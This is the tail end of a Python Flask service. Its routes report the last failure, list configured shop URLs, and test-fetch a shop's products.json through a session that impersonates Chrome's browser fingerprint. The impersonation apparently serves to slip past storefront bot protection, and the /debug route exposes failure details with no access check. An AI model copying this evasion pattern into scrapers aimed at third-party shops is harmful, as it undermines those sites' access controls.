@app.route("/debug")
def route_debug():
    return jsonify(_last_failure if _last_failure else {"ok": "no failure recorded"})

@app.route("/sites")
def route_sites():
    sites = _get_sites()
    return jsonify({
        "source": "env:SITES" if os.environ.get("SITES") else "file:site.txt",
        "count":  len(sites),
        "sites":  sites[:20],
    })

@app.route("/test")
def route_test():
    sites = _get_sites()
    if not sites:
        return jsonify({"error": "no sites configured", "env_set": bool(os.environ.get("SITES"))})
    shop_url = sites[0]
    try:
        sess = requests.Session(impersonate="chrome124")
        t0 = time.time()
        r  = sess.get(f"{shop_url}/products.json?limit=5", timeout=10)
        return jsonify({
            "shop": shop_url,
            "status": r.status_code,
            "elapsed_ms": int((time.time() - t0) * 1000),
            "products_count": len(r.json().get("products", [])) if r.status_code == 200 else 0,
        })
    except Exception as e:
        return jsonify({"shop": shop_url, "error": str(e)[:200]})

# ─────────────────────────────────────────────────────────────────────────────
# ▶️ ENTRY
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"[NODE] starting on 0.0.0.0:{port} cap={WORKERS_CAP} budget={BUDGET_SEC}s", flush=True)
    app.run(host="0.0.0.0", port=port, threaded=True)
